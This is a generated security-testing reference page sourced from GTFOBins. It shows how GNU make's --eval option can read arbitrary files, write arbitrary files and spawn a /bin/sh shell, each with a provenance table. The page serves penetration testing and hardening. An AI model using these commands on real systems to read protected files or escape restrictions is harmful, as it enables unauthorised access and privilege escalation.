---
parsed_by: focuslocust
source: commands
type: generated
---
# make Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## make

Tool page: [make](../../tools/linux/make.md)

### file-read

```text
make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/make` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
make -s --eval='$(file >/path/to/output-file,DATA)' .
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/make` |
| Evidence | Function example preserved from source parser. |

### shell

```text
make --eval='$(shell /bin/sh 1>&0)' .
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/make` |
| Evidence | Function example preserved from source parser. |
